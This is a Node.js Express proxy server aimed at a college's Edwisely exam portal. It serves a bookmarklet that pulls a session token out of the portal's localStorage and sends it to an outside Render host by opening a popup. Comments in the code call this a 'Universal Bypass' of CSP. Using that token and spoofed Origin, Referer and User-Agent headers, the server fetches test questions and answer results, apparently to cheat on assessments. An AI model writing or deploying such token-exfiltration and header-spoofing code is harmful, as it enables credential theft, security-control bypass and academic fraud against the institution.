const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

// Global logger
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

const api = express.Router();

const EDWISELY_DASH_URL = "https://rma2yovfd6.execute-api.ap-south-1.amazonaws.com/prod/v2/getDashboard";
const EDWISELY_QUES_URL = "https://bgwwm5z2al.execute-api.ap-south-1.amazonaws.com/prod/questionnaire";
const EDWISELY_RESULT_URL = "https://dbchangesstudent.edwisely.com/questionnaire/v2/getTestQuestions";

const DEFAULT_PIN = "5050";

let capturedToken = null;

const SPOOF_HEADERS = {
    'Origin': 'https://sailstudent.sairamit.edu.in',
    'Referer': 'https://sailstudent.sairamit.edu.in/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
};

// ── GET storetoken ──
// This method serves a small HTML page that auto-closes.
// Browsers allow "window.open" even when CSP blocks fetch/images.
api.get('/storetoken', (req, res) => {
    const token = req.query.token;
    if (token) {
        capturedToken = token;
        console.log(`[Token] Captured via Window Navigation (first 20 chars): ${token.slice(0, 20)}...`);
    }

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Token Captured</title>
            <style>
                body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #0f172a; color: #3b82f6; text-align: center; }
                .card { background: #1e293b; padding: 2rem; border-radius: 1rem; border: 1px solid #334155; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>✅ Token Captured!</h2>
                <p>This window will close automatically.</p>
            </div>
            <script>
                setTimeout(() => { if(window.opener) { window.close(); } }, 1500);
            </script>
        </body>
        </html>
    `);
});

api.get('/polltoken', (req, res) => {
    if (capturedToken) {
        const t = capturedToken;
        capturedToken = null;
        res.json({ token: t });
    } else {
        res.json({ token: null });
    }
});

api.get('/questions', async (req, res) => {
    try {
        const auth = req.headers.authorization;
        const { test_id } = req.query;
        const r = await axios.get(EDWISELY_QUES_URL, {
            params: {
                test_id,
                device_type: 2,
                device_details: '0.0.0.0',
                device: 'web',
                deviceInfo: 'Windows desktop Chrome browser'
            },
            headers: { ...SPOOF_HEADERS, 'Authorization': auth }
        });
        res.json(r.data);
    } catch (e) {
        console.error('[Questions error]', e.response?.data || e.message);
        res.status(e.response?.status || 500).json(e.response?.data || { error: e.message });
    }
});

api.get('/test-results', async (req, res) => {
    try {
        const auth = req.headers.authorization;
        const { test_id } = req.query;
        const r = await axios.get(EDWISELY_RESULT_URL, {
            params: { test_id },
            headers: { ...SPOOF_HEADERS, 'Authorization': auth }
        });
        res.json(r.data);
    } catch (e) {
        console.error('[Results error]', e.response?.data || e.message);
        res.status(e.response?.status || 500).json(e.response?.data || { error: e.message });
    }
});

api.get('/dashboard', async (req, res) => {
    try {
        const auth = req.headers.authorization;
        const r = await axios.get(EDWISELY_DASH_URL, {
            headers: { ...SPOOF_HEADERS, 'Authorization': auth }
        });
        res.json(r.data);
    } catch (e) {
        console.error('[Dashboard error]', e.response?.data || e.message);
        res.status(e.response?.status || 500).json(e.response?.data || { error: e.message });
    }
});

api.get('/bookmarklet', (req, res) => {
    const code = `
(function(){
  try {
    var t = localStorage.getItem('token') || localStorage.getItem('access_token');
    if(!t) {
      for(var i=0;i<localStorage.length;i++){
        var k=localStorage.key(i);
        var v=localStorage.getItem(k);
        if(v && v.startsWith('eyJ')) { t=v; break; }
      }
    }
    if(!t) { alert('Token not found. Log in first!'); return; }
    
    // The "Universal Bypass": Open a hidden popup/tab to send the token.
    // Navigating to a page is almost always allowed by CSP.
    var win = window.open('https://backend-842w.onrender.com/api/storetoken?token=' + encodeURIComponent(t), '_blank', 'width=100,height=100,left=10,top=10');
    if(!win || win.closed || typeof win.closed=='undefined') {
        alert('❌ Popup blocked! Please allow popups for Sairam portal and try again.');
    } else {
        // Window will be closed by the proxy response.
        console.log('Token navigation started...');
    }
  } catch(e) { alert('Error: ' + e.message); }
})();`.trim();
    res.json({ bookmarklet: `javascript:${encodeURIComponent(code)}` });
});

api.post('/verify-pin', (req, res) => {
    const { pin } = req.body;
    if (pin === DEFAULT_PIN) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: "Incorrect PIN" });
    }
});

app.use('/api', api);
app.get('/', (req, res) => res.send('Replica Proxy Active'));

const PORT = 3005;
app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Proxy running on port ${PORT}`));
